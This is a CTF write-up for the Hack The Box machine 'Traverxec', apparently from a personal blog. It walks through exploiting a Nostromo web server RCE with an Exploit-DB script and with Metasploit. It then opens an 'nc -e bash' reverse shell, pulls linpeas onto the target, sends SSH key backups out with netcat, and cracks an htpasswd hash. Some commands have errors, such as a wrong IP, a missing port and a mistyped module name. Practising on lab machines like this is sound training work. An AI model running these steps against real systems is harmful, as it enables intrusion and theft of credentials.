---
title: "Traverxec"
excerpt: "Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE)."
#layout: single
header:
  image: "/images/writeups.png"
  teaser: /images/traverxec/traverxec_bio.png
share_image: /images/traverxec/traverxec_bio.png
author_profile: false
tags:
  - Writeup
  - kali
  - hack the box
sidebar:
  - image: /images/traverxec/traverxec_bio.png
  - image_alt: "Traverxec"
  - nav: sidebar-traverxec
classes: 
   - wide
   - dark
toc: false
---

# Overview

Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!

---

# Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.165 | grep ^[0-9] | cut -d '/' -f
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.165
```

![Initial NMAP](/images/traverxec/nmap.png)

Once the scan completes, it reveals ports 22 and 80 are open. NMAP also reports that the `http-server-header` is `nostromo 1.9.6`, which indicates the box is running the `Nostromo` HTTP server.

---

# Nostromo

![Nostromo](/images/traverxec/nostromo.png)

The webpage appears to be pretty empty, resulting in very little information at first look. So, we fire off a gobuster:

```bash
gobuster dir -u http://10.10.10.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n
```

While we let gobuster run in the background, I look to Google. After a bit of digging, we find that Nostromo version 1.9.6 has a <a href="https://www.exploit-db.com/exploits/47837">Remote Code Execution</a> vulnerability. Being that this exploit is found on Exploit-DB, that usually means there is a Metasploit module for it - which means we can "manually" exploit it or use Metasploit. I'll show both ways.

---
# "Manual" exploitation

First, we need to copy the exploit from exploit-db and inspect it:

```bash
searchsploit -m /multiple/remote/47837
```


![Exploit](/images/traverxec/payload.png)

**The heck is going on?**

Interesting. We're exploiting the `http_verify` function in nostromo nhttpd. Which is allowing us remote code execution. Let's test it out:

```bash
python 47837.py 10.10.10.165 80 id
```
![Response](/images/traverxec/id.png)

Ok, cool, we got a response. Lets setup a listener and try to get a shell:

```bash
nc -lvnp 9001
```

```bash
python 47837.py "nc -e bash 10.10.10.165 9001"
```

And........ We get a shell

---
# Metasploit

Now that we've manually exploited Nostromo, let's automate it with `Metasploit`.

```bash
msfconsole
msf > use exploit/multi/htto/nostromo_code_exec
msf > set rhost 10.10.10.165
msf > set lhost 10.10.14.40
msf > run
```
> *Make sure you set lhost to YOUR machines IP.*

![Metasploit](/images/traverxec/metasploit.png)

After we fire off the exploit, we get a shell:

![Metasploit-Shell](/images/traverxec/meta-shell.png)

---
# Stabelize Shell
Let's move forward with our manual shell. But first, we need to stabelize it. I don't know about you, but I can't live without TAB auto-cmplete!

The target machine is Linux, so it *SHOULD* have `Python` installed, but lets check anyway.
```bash
which python
/usr/bin/python
```
*Let's spawn a TTY shell!* 
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z (to background)
stty raw -echo
fg [enter] (to send to foreground)
```
We should now have a stable shell!

---
# Automated Target Enumeration

I think it's important to always have some sort of enumeration running while we're working. So, one of the first things I do on a box is to get some sort of automated enuermation running. For Linux, I like to use `Linpeas`. There's a couple of ways we can get this onto the box, but normally I'll just `wget` it from my kali box.

*On Attacker Machine, in the Linpeas directory*
```bash
python -m SimpleHTTPServer
```

*On Target Machine*
```bash
cd /tmp/
wget 10.10.14.10:8000/linpeas.sh
```
![Linpeas](/images/traverxec/linpeas-wget.png)

Now that we have Linpeas, we use `chmod +x` to make it an executable and then `.\linpeas.sh` to run it.

![Linpeas](/images/traverxec/linpeas.png)

---
# Manual Target Enumeration

We have linpeas running, so now we can start manually enumerating the box. We check `/etc/passwd` and find the user `David` exists. It also shows us the web root for nostromo is `/var/nostromo/`. The `/var/nostromo/conf` directory, which contains the `.htpasswd` which leaks a crackable hash. We also find the file `nhttpd.conf` which reveals some interesting information. The file has a section called `HOMEDIRS` and hints towards `public_www` folders in a user's home directory.

```bash
ls -la /home/david/public_www/
ls -la /home/david/public_www/protected-file-area/
```

![Protected-Area](/images/traverxec/enum-protected.png)

**BINGO!** We find `backup-ssh-identity-files.tgz`. Let's exfiltrate it!

*On Attacker Machine*
```bash
nc -lvp 1234 > backup-ssh-identity-files.tgz
```

*On Target Machine*
```bash
nc 10.10.14.40 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```
Let's extract the files. 

```bash
tar -xvf backup-ssh-identity-files.tgz
```
The archive contains SSH keys, one of them being the private key `id_rsa`.

*Before we continue, lets check in on Linpeas*

![Linpeas-Hash](/images/traverxec/linpeas-hash.png)

Looks like it found the same hash we did. Time to crack it!

---
###### Disclaimer!

> This is a small rabbit-hole, but not entirely useless. If you didn't find the hidden directory in David's home directory, this was another way to get the same end result.

In order to crack the hash, we need to identify waht type of hash it is. By inspecting the hash, we see it starts with `$1$` - this means its an `MD5 hash`. Now, we can just throw the hash into a file and run it through `Hashcat`.

```bash
vi hash
(copy and paste hash)
:wq
```

```bash
hashcat -m 500 -a 0 --force hash /usr/share/wordlists/rockyou.txt
```
> `-m` flag is used to set the mode. `500` is to set the mode to `MD5`.

![Hashcat-Usage](/images/traverxec/hashcat1.png)

After a little while, we successfully crack the hash!

![Hashcat-Usage](/images/traverxec/hashcat2.png)